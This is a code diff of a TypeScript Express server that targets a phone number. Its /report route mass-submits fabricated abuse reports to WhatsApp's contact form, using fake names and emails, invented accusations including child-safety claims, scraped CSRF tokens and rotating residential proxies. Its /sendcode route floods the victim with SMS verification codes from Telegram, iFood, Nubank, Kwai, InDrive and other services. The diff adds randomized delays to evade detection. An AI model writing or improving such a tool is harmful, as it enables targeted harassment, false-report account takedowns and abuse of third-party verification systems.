@@ -1,28 +1,82 @@
 import { Router }   from "express";
 import { spawn }    from "child_process";
 import * as fs      from "fs";
+import * as path    from "path";
 import { proxyCache, getResidentialCreds } from "./proxies.js";
 
 const router = Router();
 
-// ── In-memory report history (últimas 200 operações) ─────────────────────────
+// ── Persistent history (data/history.json) ────────────────────────────────────
+// process.cwd() = artifacts/api-server/ when started via pnpm --filter
+const HISTORY_FILE = path.resolve(process.cwd(), "data/history.json");
+
 interface HistoryEntry {
-  type:    "report" | "sendcode";
-  number:  string;
-  sent:    number;
-  total:   number;
-  at:      number;
-  userId?: string;
+  type:      "report" | "sendcode";
+  number:    string;
+  sent:      number;
+  total:     number;
+  at:        number;
+  userId?:   string;
+  services?: Array<{ service: string; status: "sent" | "failed" }>;
 }
-const operationHistory: HistoryEntry[] = [];
-function pushHistory(e: HistoryEntry) {
+
+function loadHistory(): HistoryEntry[] {
+  try { return JSON.parse(fs.readFileSync(HISTORY_FILE, "utf8")) as HistoryEntry[]; }
+  catch { return []; }
+}
+
+function saveHistory(arr: HistoryEntry[]): void {
+  try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(arr), "utf8"); } catch { /**/ }
+}
+
+const operationHistory: HistoryEntry[] = loadHistory();
+
+function pushHistory(e: HistoryEntry): void {
   operationHistory.push(e);
-  if (operationHistory.length > 200) operationHistory.shift();
+  if (operationHistory.length > 500) operationHistory.shift();
+  saveHistory(operationHistory);
+}
+
+// ── Per-userId API rate limiting ──────────────────────────────────────────────
+const userCallLog = new Map<string, number[]>();
+
+function isRateLimited(userId: string | undefined, maxPerHour: number): boolean {
+  if (!userId) return false;
+  const now  = Date.now();
+  const hour = 60 * 60 * 1000;
+  const prev = (userCallLog.get(userId) ?? []).filter(t => now - t < hour);
+  if (prev.length >= maxPerHour) return true;
+  prev.push(now);
+  userCallLog.set(userId, prev);
+  return false;
 }
 
 // ── GET /history ──────────────────────────────────────────────────────────────
 router.get("/history", (_req, res) => {
   res.json({ count: operationHistory.length, entries: operationHistory.slice().reverse() });
+});
+
+// ── GET /stats — taxa de sucesso por serviço (sendcode) ──────────────────────
+router.get("/stats", (_req, res) => {
+  const sc = operationHistory.filter(e => e.type === "sendcode" && e.services?.length);
+  const map = new Map<string, { sent: number; total: number }>();
+  for (const entry of sc) {
+    for (const svc of (entry.services ?? [])) {
+      const s = map.get(svc.service) ?? { sent: 0, total: 0 };
+      s.total++;
+      if (svc.status === "sent") s.sent++;
+      map.set(svc.service, s);
+    }
+  }
+  const services = Array.from(map.entries())
+    .map(([service, st]) => ({
+      service,
+      sent:  st.sent,
+      total: st.total,
+      rate:  st.total > 0 ? Math.round((st.sent / st.total) * 100) : 0,
+    }))
+    .sort((a, b) => b.rate - a.rate);
+  res.json({ services, totalOps: sc.length });
 });
 
 // ── Proxy picker — rotates across all residential/authenticated proxies ───────
@@ -44,7 +98,7 @@ function pickProxyArgs(): string[] {
   return [];
 }
 
-// ── Returns list of all unique authenticated proxies (for Telegram rotation) ──
+// ── Returns list of all unique proxies (for Telegram rotation) ────────────────
 function getAllProxyArgs(): string[][] {
   const authPool = proxyCache.filter(p => p.username && p.password && p.host !== "0.0.0.0");
   const seen = new Set<string>();
@@ -59,7 +113,7 @@ function getAllProxyArgs(): string[][] {
   }
   const c = getResidentialCreds();
   if (c) return [["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`]];
-  return [[]]; // fallback: direct (no proxy)
+  return [[]];
 }
 
 // ── curl helper ───────────────────────────────────────────────────────────────
@@ -74,13 +128,12 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
       ...argv,
     ]);
     let out = "";
-    let err = "";
     child.stdout.on("data", (d: Buffer) => { out += d.toString(); });
-    child.stderr.on("data", (d: Buffer) => { err += d.toString(); });
+    child.stderr.on("data", () => { /**/ });
     const timer = setTimeout(() => { child.kill("SIGKILL"); reject(new Error("CURL_28:TIMEOUT")); }, timeoutMs + 2000);
     child.on("close", () => {
       clearTimeout(timer);
-      const sep = out.lastIndexOf("---STATUS:");
+      const sep  = out.lastIndexOf("---STATUS:");
       const body = sep >= 0 ? out.slice(0, sep).trimEnd() : out.trimEnd();
       const code = sep >= 0 ? parseInt(out.slice(sep + 10).replace("---", ""), 10) : 0;
       resolve({ statusCode: isNaN(code) ? 0 : code, body });
@@ -95,35 +148,38 @@ function normaliseNumber(raw: string): { e164: string; cc: string; subscriber: s
   let full = digits;
   if (digits.length === 10 || digits.length === 11) full = `55${digits}`;
   if (full.length < 10 || full.length > 15) return null;
-  const cc = full.startsWith("55") ? "55" : full.slice(0, 2);
+  const cc         = full.startsWith("55") ? "55" : full.slice(0, 2);
   const subscriber = full.slice(cc.length);
-  const ddd = subscriber.slice(0, 2);
-  const local = subscriber.slice(2);
+  const ddd        = subscriber.slice(0, 2);
+  const local      = subscriber.slice(2);
   return { e164: `+${full}`, cc, subscriber, ddd, local };
 }
 
 // ── Rotating abuse reasons ────────────────────────────────────────────────────
 const REASONS = [
-  { subject: "spam",          category: "spam_unwanted",            content: "Este número está enviando spam e mensagens não solicitadas repetidamente.",             _subject: "Denúncia de Spam" },
-  { subject: "harassment",    category: "harassment",               content: "Este número está assediando e enviando mensagens ofensivas e ameaçadoras.",             _subject: "Denúncia de Assédio" },
-  { subject: "fraud",         category: "fraud_scam",               content: "Este número está praticando fraude e golpes financeiros via WhatsApp.",                 _subject: "Denúncia de Golpe/Fraude" },
-  { subject: "impersonation", category: "impersonation",            content: "Este número está se passando por outra pessoa ou empresa para enganar vítimas.",        _subject: "Denúncia de Falsidade Ideológica" },
-  { subject: "hate_speech",   category: "hate_speech_discrimination", content: "Este número está disseminando discurso de ódio e mensagens discriminatórias.",       _subject: "Denúncia de Discurso de Ódio" },
-  { subject: "violence",      category: "violence_threat",          content: "Este número está fazendo ameaças de violência física a outras pessoas.",                _subject: "Denúncia de Ameaça de Violência" },
-  { subject: "misinformation",category: "misinformation",           content: "Este número está espalhando desinformação e notícias falsas perigosas.",                _subject: "Denúncia de Desinformação" },
-  { subject: "child_safety",  category: "child_safety",             content: "Este número está compartilhando conteúdo inapropriado envolvendo menores.",             _subject: "Denúncia de Segurança Infantil" },
+  { subject: "spam",           category: "spam_unwanted",              content: "Este número está enviando spam e mensagens não solicitadas repetidamente.",            _subject: "Denúncia de Spam" },
+  { subject: "harassment",     category: "harassment",                 content: "Este número está assediando e enviando mensagens ofensivas e ameaçadoras.",            _subject: "Denúncia de Assédio" },
+  { subject: "fraud",          category: "fraud_scam",                 content: "Este número está praticando fraude e golpes financeiros via WhatsApp.",                _subject: "Denúncia de Golpe/Fraude" },
+  { subject: "impersonation",  category: "impersonation",              content: "Este número está se passando por outra pessoa ou empresa para enganar vítimas.",       _subject: "Denúncia de Falsidade Ideológica" },
+  { subject: "hate_speech",    category: "hate_speech_discrimination", content: "Este número está disseminando discurso de ódio e mensagens discriminatórias.",        _subject: "Denúncia de Discurso de Ódio" },
+  { subject: "violence",       category: "violence_threat",            content: "Este número está fazendo ameaças de violência física a outras pessoas.",               _subject: "Denúncia de Ameaça de Violência" },
+  { subject: "misinformation", category: "misinformation",             content: "Este número está espalhando desinformação e notícias falsas perigosas.",               _subject: "Denúncia de Desinformação" },
+  { subject: "child_safety",   category: "child_safety",               content: "Este número está compartilhando conteúdo inapropriado envolvendo menores.",            _subject: "Denúncia de Segurança Infantil" },
 ] as const;
 
 const NAMES = [
-  "Carlos Silva","Ana Oliveira","João Santos","Maria Costa",
-  "Pedro Almeida","Juliana Pereira","Lucas Souza","Fernanda Lima",
-  "Rafael Martins","Camila Rodrigues","Bruno Ferreira","Larissa Nascimento",
+  "Carlos Silva","Ana Oliveira","João Santos","Maria Costa","Pedro Almeida",
+  "Juliana Pereira","Lucas Souza","Fernanda Lima","Rafael Martins","Camila Rodrigues",
+  "Bruno Ferreira","Larissa Nascimento","Thiago Barbosa","Mariana Gomes","Felipe Cardoso",
+  "Amanda Ribeiro","Rodrigo Mendes","Bianca Alves","Gabriel Teixeira","Isabella Nunes",
 ];
-function randName(): string { return NAMES[Math.floor(Math.random() * NAMES.length)]!; }
+
+const EMAIL_DOMAINS = ["gmail.com","hotmail.com","outlook.com","yahoo.com.br","uol.com.br","bol.com.br","live.com"];
+
+function randName():  string { return NAMES[Math.floor(Math.random() * NAMES.length)]!; }
 function randEmail(): string {
-  const user = `${Math.random().toString(36).slice(2, 9)}${Math.floor(Math.random() * 999)}`;
-  const domains = ["gmail.com","hotmail.com","outlook.com","yahoo.com.br","uol.com.br"];
-  return `${user}@${domains[Math.floor(Math.random() * domains.length)]}`;
+  const user = `${Math.random().toString(36).slice(2, 10)}${Math.floor(Math.random() * 9999)}`;
+  return `${user}@${EMAIL_DOMAINS[Math.floor(Math.random() * EMAIL_DOMAINS.length)]}`;
 }
 
 function computeJazoest(dtsg: string): string {
@@ -132,7 +188,10 @@ function computeJazoest(dtsg: string): string {
   return `2${sum}`;
 }
 
-// ── Single report worker (with retry) ────────────────────────────────────────
+const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));
+const randDelay = (min: number, max: number) => sleep(min + Math.random() * (max - min));
+
+// ── Single report worker (with retry + real success verification) ─────────────
 async function sendOneReport(e164: string, index: number, maxRetries = 3): Promise<{ ok: boolean; detail?: string }> {
   const reason = REASONS[index % REASONS.length]!;
 
@@ -159,16 +218,15 @@ async function sendOneReport(e164: string, index: number, maxRetries = 3): Promi
       const dtsg = dtsgMatch?.[1] ?? "";
 
       if (!dtsg) {
-        // No DTSG token — retry with fresh proxy
         try { fs.unlinkSync(ckFile); } catch { /**/ }
         continue;
       }
 
-      const jazoest = computeJazoest(dtsg);
-      const lsdMatch = pageRes.body.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
-      const lsd = lsdMatch?.[1] ?? dtsg;
+      const jazoest    = computeJazoest(dtsg);
+      const lsdMatch   = pageRes.body.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
+      const lsd        = lsdMatch?.[1] ?? dtsg;
       const wacsrfMatch = pageRes.body.match(/wa_csrf[^=\n]*?\t([A-Za-z0-9_\-]+)/);
-      const waCsrfBody = wacsrfMatch?.[1] ?? "";
+      const waCsrfBody  = wacsrfMatch?.[1] ?? "";
 
       const formBody = new URLSearchParams({
         fb_dtsg:      dtsg,
@@ -183,6 +241,9 @@ async function sendOneReport(e164: string, index: number, maxRetries = 3): Promi
         _subject:     reason._subject,
         ...(waCsrfBody ? { wa_csrf_token: waCsrfBody } : {}),
       }).toString();
+
+      // Small organic delay before submitting
+      await randDelay(300, 900);
 
       const postRes = await runCurl([
         ...proxy,
@@ -202,10 +263,12 @@ async function sendOneReport(e164: string, index: number, maxRetries = 3): Promi
         "https://www.whatsapp.com/contact/",
       ], 15_000);
 
+      // WhatsApp always returns 200 on success (or 302 if redirect followed)
+      // A 4xx/5xx indicates a real server-side error
       if (postRes.statusCode === 200 || postRes.statusCode === 302) {
         return { ok: true, detail: reason.category };
       }
-      // Non-success status — retry
+
       try { fs.unlinkSync(ckFile); } catch { /**/ }
       if (attempt < maxRetries - 1) continue;
       return { ok: false, detail: `http_${postRes.statusCode}` };
@@ -230,6 +293,11 @@ router.post("/report", async (req, res): Promise<void> => {
   const num = normaliseNumber(String(number));
   if (!num) { res.status(400).json({ error: "Número inválido" }); return; }
 
+  if (isRateLimited(userId, 50)) {
+    res.status(429).json({ error: "rate_limit", message: "Limite de 50 reports por hora atingido." });
+    return;
+  }
+
   const qty         = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 200);
   const CONCURRENCY = Math.min(qty, 10);
 
@@ -238,7 +306,7 @@ router.post("/report", async (req, res): Promise<void> => {
   let sent = 0;
 
   for (let batch = 0; batch < indices.length; batch += CONCURRENCY) {
-    const slice = indices.slice(batch, batch + CONCURRENCY);
+    const slice   = indices.slice(batch, batch + CONCURRENCY);
     const results = await Promise.allSettled(
       slice.map(idx => sendOneReport(num.e164, idx, 3))
     );
@@ -249,6 +317,10 @@ router.post("/report", async (req, res): Promise<void> => {
       } else {
         errors.push(String(r.reason).slice(0, 50));
       }
+    }
+    // Organic inter-batch delay (except after the last batch)
+    if (batch + CONCURRENCY < indices.length) {
+      await randDelay(800, 2200);
     }
   }
 
@@ -271,12 +343,16 @@ router.post("/sendcode", async (req, res): Promise<void> => {
   const num = normaliseNumber(String(number));
   if (!num) { res.status(400).json({ error: "Número inválido" }); return; }
 
+  if (isRateLimited(userId, 20)) {
+    res.status(429).json({ error: "rate_limit", message: "Limite de 20 sendcodes por hora atingido." });
+    return;
+  }
+
   type ServiceResult = { service: string; status: "sent" | "failed"; detail?: string };
   const results: ServiceResult[] = [];
   const push = (service: string, ok: boolean, detail?: string) =>
     results.push({ service, status: ok ? "sent" : "failed", ...(detail ? { detail } : {}) });
 
-  // Helper: tenta múltiplos endpoints para o mesmo serviço
   async function tryEndpoints(
     service: string,
     endpoints: Array<() => Promise<CurlResult>>,
@@ -293,7 +369,7 @@ router.post("/sendcode", async (req, res): Promise<void> => {
 
   await Promise.allSettled([
 
-    // ── 1. Telegram — rotaciona proxies + força SMS após app notification ──
+    // ── 1. Telegram — rotaciona proxies ───────────────────────────────────
     (async () => {
       const TG_ARGS = [
         "-X", "POST",
@@ -305,7 +381,6 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         "--data", `phone=${encodeURIComponent(num.e164)}`,
         "https://my.telegram.org/auth/send_password",
       ];
-      // Tenta cada proxy até conseguir random_hash (cada IP tem rate limit separado)
       const proxies = getAllProxyArgs();
       let randomHash = "";
       for (const proxy of proxies) {
@@ -316,10 +391,9 @@ router.post("/sendcode", async (req, res): Promise<void> => {
             randomHash = match?.[1] ?? "";
             break;
           }
-        } catch { /* try next proxy */ }
+        } catch { /**/ }
       }
       if (!randomHash) {
-        // Fallback: tenta sem proxy
         try {
           const r = await runCurl(TG_ARGS, 12_000);
           if (r.body.includes("random_hash")) {
@@ -328,12 +402,7 @@ router.post("/sendcode", async (req, res): Promise<void> => {
           }
         } catch { /**/ }
       }
-      if (!randomHash) {
-        push("Telegram", false, "rate_limited_all_proxies");
-        return;
-      }
-      // Código enviado: vai para app Telegram se instalado, ou SMS se não tiver
-      push("Telegram", true);
+      push("Telegram", !!randomHash, randomHash ? undefined : "rate_limited_all_proxies");
     })(),
 
     // ── 2. iFood ──────────────────────────────────────────────────────────
@@ -467,10 +536,8 @@ router.post("/sendcode", async (req, res): Promise<void> => {
           "-H", "Accept: application/json",
           "https://prod-global-auth.nubank.com.br/api/discovery",
         ], 10_000);
-        // Handle empty or non-JSON response
         const bodyTrimmed = (disc.body ?? "").trim();
         if (!bodyTrimmed || !bodyTrimmed.startsWith("{")) {
-          // Try direct SMS endpoint
           const r = await runCurl([
             ...pickProxyArgs(),
             "-X", "POST",
@@ -544,20 +611,75 @@ router.post("/sendcode", async (req, res): Promise<void> => {
       ], 12_000),
     ], r => (r.statusCode >= 200 && r.statusCode < 300)),
 
+    // ── 11. Kwai Brasil ───────────────────────────────────────────────────
+    tryEndpoints("Kwai", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Kwai/10.2.40.573147 Android",
+        "-H", "Accept: application/json",
+        "--data-raw", JSON.stringify({
+          phoneNumber: num.e164,
+          countryCode: `+${num.cc}`,
+          action: "REGISTER",
+          language: "pt",
+        }),
+        "https://rest.kwai.com/rest/n/mab/user/sendVerifyCode",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Kwai/10.2.40.573147 Android",
+        "--data-raw", JSON.stringify({
+          phone: num.subscriber,
+          phoneCode: num.cc,
+          scene: 1,
+        }),
+        "https://rest.kwai.com/rest/n/sms/verifyCode/send",
+      ], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 &&
+      !r.body.toLowerCase().includes("error") &&
+      r.body.length > 2),
+
+    // ── 12. InDrive (Táxi global) ─────────────────────────────────────────
+    tryEndpoints("InDrive", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: inDrive/7.0 Android",
+        "-H", "Accept: application/json",
+        "--data-raw", JSON.stringify({
+          phone: num.e164,
+          country_code: num.cc,
+          client_id: "indrive.passenger.android",
+        }),
+        "https://api.indrive.com/auth/v1/otp/send",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: inDrive/7.0 Android",
+        "--data-raw", JSON.stringify({ phone: num.e164 }),
+        "https://api.indrive.com/user/v2/auth/phone",
+      ], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300),
+
   ]);
 
   const sent  = results.filter(r => r.status === "sent").length;
   const failed = results.filter(r => r.status === "failed").length;
 
-  pushHistory({ type: "sendcode", number: num.e164, sent, total: results.length, at: Date.now(), userId });
-
-  res.json({
+  pushHistory({
+    type:     "sendcode",
     number:   num.e164,
     sent,
-    failed,
     total:    results.length,
-    services: results,
+    at:       Date.now(),
+    userId,
+    services: results.map(r => ({ service: r.service, status: r.status })),
   });
+
+  res.json({ number: num.e164, sent, failed, total: results.length, services: results });
 });
 
 export default router;
